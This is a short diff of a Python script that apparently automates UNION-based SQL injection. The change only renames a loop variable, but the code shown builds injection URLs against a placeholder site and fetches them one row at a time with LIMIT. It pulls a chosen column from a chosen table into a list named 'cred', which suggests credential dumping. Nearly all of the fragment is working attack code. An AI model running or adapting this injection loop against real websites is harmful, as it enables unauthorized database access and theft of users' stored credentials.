@@ -195,14 +195,14 @@ print(c)
 cred = []
 
 def datas():
-    for fuck in range(1, int(c) + 1):
+    for red in range(1, int(c) + 1):
         url = (
             "https://www.example.com' and 0 union select 1,2,3,4,"
             + columnname
             + ",6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from "
             + tablename
             + " limit "
-            + str(fuck)
+            + str(red)
             + " -- -"
         )
         response = requests.get(url)
